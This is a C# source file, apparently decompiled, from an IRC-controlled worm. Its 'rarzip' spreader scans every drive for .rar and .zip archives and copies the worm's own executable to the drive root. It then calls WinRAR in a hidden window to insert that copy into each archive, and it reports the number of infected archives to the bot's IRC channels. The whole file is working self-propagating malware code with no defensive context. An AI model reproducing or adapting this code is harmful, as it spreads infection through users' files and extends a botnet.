using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace rundll32.spreaders;

public class rarzip
{
	public static int infectedArchives = 0;

	private static string _rarPath;

	private static string _copiedExeName;

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string path, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath, int shortPathLength);

	private static void Search(string pathName)
	{
		string[] files = Directory.GetFiles(pathName);
		string[] array = files;
		foreach (string text in array)
		{
			if (text.Contains(".rar"))
			{
				RarStart(text);
			}
			if (text.Contains(".zip"))
			{
				RarStart(text);
			}
		}
		string[] directories = Directory.GetDirectories(pathName);
		string[] array2 = directories;
		foreach (string pathName2 in array2)
		{
			Search(pathName2);
		}
	}

	public static void spread(string myExeName, irc irc)
	{
		_copiedExeName = myExeName;
		string[] logicalDrives = Environment.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string pathName in array)
		{
			Search(pathName);
		}
		string[][] onConnChannels = config.onConnChannels;
		foreach (string[] array2 in onConnChannels)
		{
			irc.sendMessage(array2[0], ".:RAR-ZIP:. - \u000308Infected \u000309" + infectedArchives + "\u000308 archives!");
		}
	}

	private static void RarStart(string archiveToInject)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
		_rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
		if (File.Exists(_rarPath))
		{
			if (!File.Exists(Path.Combine(path, _copiedExeName)))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(path, _copiedExeName));
			}
			StringBuilder stringBuilder = new StringBuilder(255);
			GetShortPathName(Path.Combine(path, _copiedExeName), stringBuilder, stringBuilder.Capacity);
			string text = stringBuilder.ToString();
			StringBuilder stringBuilder2 = new StringBuilder(255);
			GetShortPathName(archiveToInject, stringBuilder2, stringBuilder2.Capacity);
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string arguments = string.Concat(" a ", stringBuilder2, " ", text);
				processStartInfo.FileName = _rarPath;
				processStartInfo.Arguments = arguments;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
				infectedArchives++;
			}
			catch
			{
			}
		}
		_rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Replace("Program Files", "Program Files (x86)") + "\\WinRAR\\WinRAR.exe";
		if (File.Exists(_rarPath))
		{
			if (!File.Exists(Path.Combine(path, _copiedExeName)))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(path, _copiedExeName));
			}
			StringBuilder stringBuilder3 = new StringBuilder(255);
			GetShortPathName(Path.Combine(path, _copiedExeName), stringBuilder3, stringBuilder3.Capacity);
			string text2 = stringBuilder3.ToString();
			StringBuilder stringBuilder4 = new StringBuilder(255);
			GetShortPathName(archiveToInject, stringBuilder4, stringBuilder4.Capacity);
			try
			{
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
				string arguments2 = string.Concat(" a ", stringBuilder4, " ", text2);
				processStartInfo2.FileName = _rarPath;
				processStartInfo2.Arguments = arguments2;
				processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo2);
				infectedArchives++;
			}
			catch
			{
			}
		}
	}
}
